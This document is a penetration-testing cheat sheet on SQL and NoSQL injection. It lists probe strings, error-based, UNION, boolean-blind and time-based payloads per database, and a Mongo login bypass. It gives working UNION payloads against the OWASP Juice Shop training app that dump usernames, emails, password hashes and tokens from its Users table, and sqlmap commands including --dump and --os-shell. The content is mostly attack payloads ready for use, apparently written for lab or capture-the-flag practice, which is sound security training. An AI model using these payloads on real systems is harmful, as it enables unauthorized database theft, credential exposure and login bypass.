# SQL Injection

## 0. Identify

Fire these at any parameter that lands in SQL. Any 500 / behavior change / different row count = investigate.

```
'
"
`
\
'; --
' OR '1'='1
' OR 1=1--
' OR 1=1-- -
`); --
"))--
```

## 1. Error-based

Goal: coax a DB error that leaks query shape or data.

- Append `'` and look at the server response for echoed SQL.
- Try `' AND extractvalue(1,concat(0x7e,(SELECT version())))--` on MySQL.
- SQLite leaks query text in `SQLITE_ERROR` messages when the app doesn't sanitize error output.

## 2. UNION-based

Template rules:
1. **Close syntax** first (quotes + parens) so the left SELECT parses.
2. **Match column count** — add filler columns until `number of result columns` error goes away. Easiest ramp:
   ```
   ' UNION SELECT NULL--
   ' UNION SELECT NULL,NULL--
   ' UNION SELECT NULL,NULL,NULL--     ... etc.
   ```
3. **Find a visible column** — replace NULLs one at a time with `'HERE'` and see which one shows up in the response.
4. **Dump** — put real data (`username`, `password`, `email`, etc.) into the visible slots.

### Juice Shop (SQLite) — product search

Query template:
```sql
SELECT * FROM Products WHERE ((name LIKE '%<INPUT>%' OR description LIKE '%<INPUT>%') AND deletedAt IS NULL) ORDER BY name
```

Working payloads (q param, URL-encode in a browser):
```
'))--                                                           # breaks out, returns everything
')) UNION SELECT sql,sql,sql,sql,sql,sql,NULL,sql,sql,sql FROM sqlite_master WHERE type='table'--
')) UNION SELECT id,username,email,password,role,deluxeToken,NULL,'8','9','10' FROM Users--
```

Juice-Shop-specific gotchas:
- **10 columns** required (Products has id, name, description, price, deluxePrice, image, alternateImages, createdAt, updatedAt, deletedAt).
- **Column 7 must be NULL** — handler does `JSON.parse(alternateImages)`; non-JSON strings crash.
- **200-char limit** on `q` — if your payload gets truncated, your closing `--` falls off → `near "%": syntax error`.
- Errors in the search handler fall through to Angular SPA → "Unexpected path" message. That's an app error, not a routing one.

### Finding column count via ORDER BY

Faster than UNION ramp when columns are many:
```
' ORDER BY 1--
' ORDER BY 2--
...
' ORDER BY N--     # last one that works = column count
```

## 3. Blind — boolean

No visible output. Confirm with observable response diff (length, status, redirect).

```
' AND 1=1--      # TRUE  → normal response
' AND 1=2--      # FALSE → changed response
```

Extract char-by-char:
```
' AND SUBSTR((SELECT password FROM users WHERE id=1),1,1)='a'--
```

## 4. Blind — time-based

```
MySQL:    ' AND SLEEP(5)--
Postgres: '; SELECT pg_sleep(5)--
MSSQL:    '; WAITFOR DELAY '0:0:5'--
SQLite:   ' AND 1=randomblob(100000000)--     # CPU-based, no native sleep
Oracle:   ' AND DBMS_PIPE.RECEIVE_MESSAGE('a',5)=1--
```

## 5. Second-order

Payload stored in DB, triggered later in a different query. Register with payload as username, then trigger via password reset / profile view.

## 6. NoSQL (Mongo)

```
Login bypass (JSON body):
{ "email": {"$ne": null}, "password": {"$ne": null} }

Boolean (query param):
?user[$regex]=^a&password[$ne]=
```

## Column-count & schema lookup

```
MySQL:    SELECT table_name FROM information_schema.tables
Postgres: SELECT tablename FROM pg_tables
MSSQL:    SELECT name FROM sysobjects WHERE xtype='U'
SQLite:   SELECT name,sql FROM sqlite_master WHERE type='table'
Oracle:   SELECT table_name FROM all_tables
```

## Automation

```bash
sqlmap -u 'http://target/path?id=1' --batch --dbs
sqlmap -r request.txt --batch --dump -T Users
```

Flags worth knowing: `--level=5 --risk=3`, `--tamper=space2comment,between`, `--technique=U` (UNION only), `--os-shell`.

## Offline reference

On the Kali VM:
```bash
rg -n -i 'sql injection|sqli' /opt/tools/PayloadsAllTheThings/
ls /opt/tools/PayloadsAllTheThings/SQL\ Injection/
```
